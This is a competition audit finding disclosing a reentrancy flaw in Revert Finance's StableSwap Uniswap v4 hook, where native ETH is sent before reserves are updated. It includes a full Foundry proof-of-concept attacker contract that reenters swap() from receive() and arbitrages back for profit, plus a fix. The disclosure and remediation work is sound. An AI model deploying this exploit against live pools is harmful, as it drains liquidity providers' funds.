# [HIGH] Native ETH `removeLiquidity` reentrancy allows swaps against stale reserves and profitable LP fund extraction

```text
id         : W3-002
protocol   : Revert Finance — StableSwap Hooks (Uniswap v4 hook)
platform   : Cantina competition, finding #1210 (as huuduan)
severity   : high  (likelihood: high / impact: high)
class      : reentrancy / stale reserves (CEI violation)
status     : confirmed
date       : 2026-05-07
commit     : revert-finance/stableswap-hooks @ cf0c30e576f144809df9819f4d3ad49e0b7fe2d7
```

Original submission: <https://cantina.xyz/code/e55ee7b9-6c99-42f8-8338-39f3dd134ef3/findings/1210>

## Summary

`removeLiquidity()` is reentrant for pools containing native ETH because the hook transfers ETH to the LP before updating its internal `reserves`.

During `Liquidity._handleRemoveLiquidityCallback()`, the hook calls `poolManager.take(currency, sender, amount)` and only decrements `reserves[i]` after `take()` returns. For native ETH, `poolManager.take()` sends ETH to `sender`, invoking `sender.receive()` if `sender` is a contract.

At that point the PoolManager is already unlocked, so the recipient can directly call `poolManager.swap()` from `receive()`. The swap hook prices the swap using stale reserves that still include the withdrawn ETH. This allows the attacker to trade against phantom liquidity, over-extract ETH, and then perform a follow-up arbitrage to realize net profit at LP expense.

## Root cause

The vulnerable code is in `src/Liquidity.sol`:

```solidity
function _handleRemoveLiquidityCallback(bytes calldata data) internal {
    (, uint256 shares, uint256[] memory minAmounts, address sender) =
        abi.decode(data, (uint256, uint256, uint256[], address));

    if (shares > balanceOf(sender)) {
        revert InsufficientShares();
    }

    uint256[] memory amounts = _calculateRemoveLiquidity(shares);

    for (uint256 i = 0; i < currenciesLength; ++i) {
        if (amounts[i] < minAmounts[i]) {
            revert InsufficientAmounts();
        }

        Currency currency = currencies[i];

        poolManager.burn(address(this), currency.toId(), amounts[i]);
        poolManager.take(currency, sender, amounts[i]);

        reserves[i] -= amounts[i];
    }

    _burn(sender, shares);

    emit LiquidityRemoved(sender, amounts, shares);
}
```

The issue is the ordering:

```solidity
poolManager.take(currency, sender, amounts[i]);
reserves[i] -= amounts[i];
```

For native ETH pools, `poolManager.take()` transfers ETH to `sender`. If `sender` is a contract, its `receive()` function is executed before the hook decrements `reserves[i]`.

This creates an externally callable window where:

1. The hook has already burned its PoolManager claim for the withdrawn ETH.
2. The PoolManager has already sent native ETH to the attacker.
3. The hook's internal `reserves[ETH]` still includes the withdrawn amount.
4. The PoolManager remains unlocked because `removeLiquidity()` is still executing inside `poolManager.unlock()`.

The attacker does not need to call `poolManager.unlock()` again. Calling `unlock()` again would revert with `AlreadyUnlocked`, but direct PoolManager actions are allowed while the PoolManager is already unlocked. Therefore the attacker can call `poolManager.swap()` directly from `receive()`.

The swap path then calls the hook's `_beforeSwap()` logic in `src/Swap.sol`, where pricing is based on the hook's internal reserves:

```solidity
for (uint256 i = 0; i < currenciesLength; ++i) {
    ctx.scaledReserves[i] = StableSwapMath.scaleTo(reserves[i], _getRate(i));
}
```

Because `reserves[ETH]` has not been decremented yet, the swap is priced as if the withdrawn ETH were still available in the pool.

After the reentrant swap completes, execution returns to `_handleRemoveLiquidityCallback()`, which continues and subtracts the precomputed withdrawal amount from reserves. The result is an abnormal pool imbalance that can be arbitraged for net profit.

A normal user flow cannot reproduce this profit. If the attacker performs swap → remove → swap in separate normal calls, the remove step calculates the LP withdrawal from the already-updated reserves after the first swap. The attacker does not get to both:

- receive a withdrawal amount calculated from the balanced pre-swap pool, and
- insert a large swap before those withdrawal amounts are reflected in reserves.

The bug gives the attacker exactly that inconsistent state.

## Attack path

The attack executes atomically in one transaction:

```text
attacker.removeLiquidity()
  -> hook callback
    -> poolManager.take(ETH, attacker)
      -> attacker.receive()
        -> poolManager.swap()        // priced against stale reserves
    -> hook resumes removeLiquidity()
attacker.arbitrageBack()
```

Prerequisites:

1. The pool contains native ETH as one of its currencies.
2. The attacker holds LP shares.
3. The attacker calls `removeLiquidity()` from a contract with a `receive()` function.
4. The attacker has enough of the paired token to perform the reentrant swap.
5. The PoolManager allows direct actions while already unlocked, which is part of the Uniswap v4 PoolManager design.

No privileged role is required: no admin access, fee collector access, oracle manipulation, or special token behavior.

The PoolManager lock is insufficient protection here. It prevents nested `unlock()` calls, but the exploit never calls `unlock()` recursively; it calls `poolManager.swap()` directly while the PoolManager is already unlocked.

## Impact

Loss of funds for LPs in pools containing native ETH. The reentrant swap is priced against reserves that include ETH which has already been withdrawn, so it receives more ETH than correct accounting would allow.

Walkthrough with the PoC numbers:

| Step | State |
|---|---|
| Initial pool | 10,000 ETH / 10,000 MOCK |
| Attacker adds 5,000 ETH / 5,000 MOCK | 15,000 ETH / 15,000 MOCK |
| Attacker holds | 5,000 LP shares + 10,000 MOCK |
| Withdrawal amount computed by `removeLiquidity()` | 5,000 ETH + 5,000 MOCK |
| Reserves seen by the reentrant swap (stale) | 15,000 ETH / 15,000 MOCK |
| Reserves it should have seen | 10,000 ETH / 10,000 MOCK |

Inside `receive()`, the attacker swaps 10,000 MOCK → ETH:

```text
output against stale reserves   : ~9,883.052 ETH
output with correct accounting  : ~9,338.325 ETH
over-extraction                 :   ~544.727 ETH
```

After the reentrant swap finishes, `_handleRemoveLiquidityCallback()` resumes and still subtracts the precomputed removal amounts, leaving the pool heavily imbalanced at ~116.948 ETH / 20,000 MOCK. The attacker then arbitrages back: 8,447.5 ETH → ~11,168.792 MOCK.

```text
ETH   : 5,000 withdrawn + 9,883.052 from reentrant swap - 8,447.5 arb  = ~6,435.552
MOCK  : 5,000 withdrawn + 11,168.792 from arb                           = ~16,168.792

final value    : ~22,604.344
starting value :  20,000       (5,000 ETH + 15,000 MOCK)
net profit     :  ~2,604.344
```

The PoC measures actual ETH balance plus actual ERC20 balance after the exploit; the profit is not based on a quote.

This is not normal AMM arbitrage. Under the normal sequence swap → remove → swap, the attacker ends at ~19,991.879, a net loss of ~8.121.

**Likelihood:** high for any deployed pool that includes native ETH. Native ETH transfer naturally hands control to the receiver, so the callback path through `receive()` is straightforward and reliable.

## Proof of concept

<details>
<summary>Full Foundry test</summary>

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapMath} from "src/libraries/StableSwapMath.sol";
import {MockERC20} from "test/scenarios/mocks/MockERC20.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";

/// @notice PoC for native ETH removeLiquidity reentrancy via PoolManager.take().
contract RemoveLiquidityNativeTakeReentrancyPoC is ExternalContractsDeployer {
    uint256 internal constant LP_FEE_PERCENTAGE = 300;
    uint256 internal constant AMP = 100;
    uint256 internal constant INITIAL_LIQUIDITY = 10_000 ether;

    StableSwapHooksFactoryHarness internal factory;
    StableSwapHooks internal hooks;
    MockERC20 internal token;

    Currency internal nativeEth;
    Currency internal tokenCurrency;

    address internal admin;
    address internal liquidityProvider;

    function setUp() public override {
        super.setUp();

        nativeEth = Currency.wrap(address(0));
        token = new MockERC20("Mock Token", "MOCK", 18);
        tokenCurrency = Currency.wrap(address(token));

        admin = makeAddr("admin");
        liquidityProvider = makeAddr("liquidityProvider");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            admin,
            makeAddr("protocolFeeCollector"),
            makeAddr("hookFeeCollector"),
            keccak256(type(StableSwapHooks).creationCode)
        );

        _deployHooks();
        _addInitialLiquidity();
    }

    function test_poc_removeLiquidityNativeTakeReentrancy_ExtractsNetProfit() public {
        NativeTakeReentrancyAttacker attacker =
            new NativeTakeReentrancyAttacker(hooks, IPoolManager(poolManager), token, _getPoolKey());

        uint256 attackerLiquidity = 5_000 ether;
        uint256 reentrantTokenIn = 10_000 ether;
        uint256 arbEthIn = 84_475 ether / 10;

        token.mint(address(attacker), attackerLiquidity + reentrantTokenIn);
        vm.deal(address(this), attackerLiquidity);

        uint256 startingValue = attackerLiquidity + token.balanceOf(address(attacker));

        attacker.seedLiquidity{value: attackerLiquidity}(attackerLiquidity, attackerLiquidity);

        uint256 sharesToRemove = hooks.balanceOf(address(attacker));
        uint256 ethReserveBeforeRemove = hooks.reserves(0);
        uint256[] memory expectedWithdrawn = hooks.quoteRemoveLiquidity(sharesToRemove);
        uint256 expectedBaselineEthOut = _quoteTokenToEthAfterRemove(
            ethReserveBeforeRemove - expectedWithdrawn[0], hooks.reserves(1) - expectedWithdrawn[1], reentrantTokenIn
        );

        attacker.attack(sharesToRemove, reentrantTokenIn);

        assertTrue(attacker.reentered(), "receive() should reenter during native ETH take");
        assertEq(attacker.ethReserveDuringReceive(), ethReserveBeforeRemove, "hook reserve is stale during receive()");
        assertEq(
            attacker.expectedEthReserveAfterTake(),
            ethReserveBeforeRemove - expectedWithdrawn[0],
            "correct ETH reserve should exclude removed ETH"
        );
        assertGt(
            attacker.ethReceivedFromReentrantSwap(),
            expectedBaselineEthOut,
            "stale reserves overpay the token->ETH swap"
        );

        uint256 valueAfterFirstLeg = address(attacker).balance + token.balanceOf(address(attacker));
        assertLt(valueAfterFirstLeg, startingValue, "the first swap alone need not be net-profitable");

        attacker.arbitrageBack(arbEthIn);

        uint256 finalValue = address(attacker).balance + token.balanceOf(address(attacker));
        assertGt(finalValue, startingValue, "reentrant stale swap plus arb back produces net profit");
        assertGt(finalValue - startingValue, 2_000 ether, "profit is material in this setup");
    }

    function _deployHooks() private {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = nativeEth;
        currencies[1] = tokenCurrency;

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, code);

        hooks = StableSwapHooks(factory.deploy(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, salt, code));
    }

    function _addInitialLiquidity() private {
        vm.deal(liquidityProvider, INITIAL_LIQUIDITY);
        token.mint(liquidityProvider, INITIAL_LIQUIDITY);

        vm.prank(liquidityProvider);
        token.approve(address(hooks), type(uint256).max);

        vm.prank(liquidityProvider);
        hooks.addLiquidity{value: INITIAL_LIQUIDITY}(
            _makeAmounts(INITIAL_LIQUIDITY, INITIAL_LIQUIDITY), new uint256[](2), 0
        );
    }

    function _makeAmounts(uint256 _eth, uint256 _token) internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](2);
        amounts[0] = _eth;
        amounts[1] = _token;
    }

    function _getPoolKey() internal view returns (PoolKey memory) {
        return PoolKey({
            currency0: nativeEth,
            currency1: tokenCurrency,
            fee: uint24(LP_FEE_PERCENTAGE),
            tickSpacing: hooks.TICK_SPACING(),
            hooks: IHooks(address(hooks))
        });
    }

    function _quoteTokenToEthAfterRemove(uint256 _ethReserve, uint256 _tokenReserve, uint256 _tokenAmountIn)
        internal
        view
        returns (uint256)
    {
        uint256[] memory scaledReserves = new uint256[](2);
        scaledReserves[0] = _ethReserve;
        scaledReserves[1] = _tokenReserve;

        uint256 invariant = StableSwapMath.getInvariant(scaledReserves, hooks.getCurrentAmp());
        uint256 newTokenReserve = _tokenReserve + _tokenAmountIn;
        uint256 newEthReserve =
            StableSwapMath.getTargetReserves(1, 0, newTokenReserve, scaledReserves, hooks.getCurrentAmp(), invariant);
        uint256 rawAmountOut = _ethReserve - newEthReserve;
        uint256 lpFees = Math.mulDiv(rawAmountOut, LP_FEE_PERCENTAGE, 1e6, Math.Rounding.Ceil);

        return rawAmountOut - lpFees;
    }
}

contract NativeTakeReentrancyAttacker is IUnlockCallback {
    using SafeERC20 for IERC20;

    StableSwapHooks private immutable hooks;
    IPoolManager private immutable poolManager;
    MockERC20 private immutable token;

    Currency private immutable nativeEth;
    Currency private immutable tokenCurrency;
    PoolKey private poolKey;

    bool private attacking;
    uint256 private reentrantTokenIn;

    bool public reentered;
    uint256 public ethReserveBeforeRemove;
    uint256 public ethReserveDuringReceive;
    uint256 public expectedEthReserveAfterTake;
    uint256 public ethReceivedFromReentrantSwap;
    uint256 public tokenReceivedFromArbBack;

    constructor(StableSwapHooks _hooks, IPoolManager _poolManager, MockERC20 _token, PoolKey memory _poolKey) {
        hooks = _hooks;
        poolManager = _poolManager;
        token = _token;
        nativeEth = Currency.wrap(address(0));
        tokenCurrency = Currency.wrap(address(_token));
        poolKey = _poolKey;

        _token.approve(address(_hooks), type(uint256).max);
    }

    function seedLiquidity(uint256 _ethAmount, uint256 _tokenAmount) external payable {
        require(msg.value == _ethAmount, "bad eth");

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = _ethAmount;
        amounts[1] = _tokenAmount;

        hooks.addLiquidity{value: _ethAmount}(amounts, new uint256[](2), 0);
    }

    function attack(uint256 _sharesToRemove, uint256 _reentrantTokenIn) external {
        uint256[] memory withdrawAmounts = hooks.quoteRemoveLiquidity(_sharesToRemove);
        ethReserveBeforeRemove = hooks.reserves(0);
        expectedEthReserveAfterTake = ethReserveBeforeRemove - withdrawAmounts[0];
        reentrantTokenIn = _reentrantTokenIn;
        attacking = true;

        hooks.removeLiquidity(_sharesToRemove, new uint256[](2));

        attacking = false;
    }

    function arbitrageBack(uint256 _ethAmountIn) external {
        poolManager.unlock(abi.encode(_ethAmountIn));
    }

    function unlockCallback(bytes calldata _data) external override returns (bytes memory) {
        require(msg.sender == address(poolManager), "only pool manager");

        uint256 ethAmountIn = abi.decode(_data, (uint256));
        BalanceDelta swapDelta = poolManager.swap(
            poolKey,
            SwapParams({
                zeroForOne: true, amountSpecified: -int256(ethAmountIn), sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
            }),
            ""
        );

        int128 ethDelta = swapDelta.amount0();
        int128 tokenDelta = swapDelta.amount1();
        require(ethDelta < 0 && tokenDelta > 0, "unexpected arb delta");

        uint256 ethOwed = uint256(int256(-ethDelta));
        uint256 tokenToTake = uint256(int256(tokenDelta));

        poolManager.settle{value: ethOwed}();
        poolManager.take(tokenCurrency, address(this), tokenToTake);

        tokenReceivedFromArbBack = tokenToTake;

        return "";
    }

    receive() external payable {
        if (!attacking || reentered || msg.sender != address(poolManager)) {
            return;
        }

        reentered = true;
        ethReserveDuringReceive = hooks.reserves(0);

        uint256 balanceBeforeSwapTake = address(this).balance;

        BalanceDelta swapDelta = poolManager.swap(
            poolKey,
            SwapParams({
                zeroForOne: false,
                amountSpecified: -int256(reentrantTokenIn),
                sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );

        int128 ethDelta = swapDelta.amount0();
        int128 tokenDelta = swapDelta.amount1();
        require(ethDelta > 0 && tokenDelta < 0, "unexpected reentrant delta");

        uint256 tokenOwed = uint256(int256(-tokenDelta));
        uint256 ethToTake = uint256(int256(ethDelta));

        poolManager.sync(tokenCurrency);
        IERC20(address(token)).safeTransfer(address(poolManager), tokenOwed);
        poolManager.settle();
        poolManager.take(nativeEth, address(this), ethToTake);

        ethReceivedFromReentrantSwap = address(this).balance - balanceBeforeSwapTake;
    }
}
```

</details>

## Fix

Update state before performing external transfers. The most direct fix is to apply checks-effects-interactions in `_handleRemoveLiquidityCallback()`:

1. Decode and validate inputs.
2. Calculate withdrawal amounts.
3. Validate `minAmounts`.
4. Burn LP shares.
5. Decrement all reserves.
6. Only then call `poolManager.burn()` and `poolManager.take()`.

```solidity
function _handleRemoveLiquidityCallback(bytes calldata data) internal {
    (, uint256 shares, uint256[] memory minAmounts, address sender) =
        abi.decode(data, (uint256, uint256, uint256[], address));

    if (shares > balanceOf(sender)) {
        revert InsufficientShares();
    }

    uint256[] memory amounts = _calculateRemoveLiquidity(shares);

    for (uint256 i = 0; i < currenciesLength; ++i) {
        if (amounts[i] < minAmounts[i]) {
            revert InsufficientAmounts();
        }
    }

    _burn(sender, shares);

    for (uint256 i = 0; i < currenciesLength; ++i) {
        reserves[i] -= amounts[i];
    }

    for (uint256 i = 0; i < currenciesLength; ++i) {
        Currency currency = currencies[i];

        poolManager.burn(address(this), currency.toId(), amounts[i]);
        poolManager.take(currency, sender, amounts[i]);
    }

    emit LiquidityRemoved(sender, amounts, shares);
}
```

This removes the stale-reserve window: any reentrant swap during `take()` would observe reserves after the withdrawal has already been accounted for.

## Timeline

- 2026-05-07 — submitted
- 2026-05-12 — last updated on Cantina
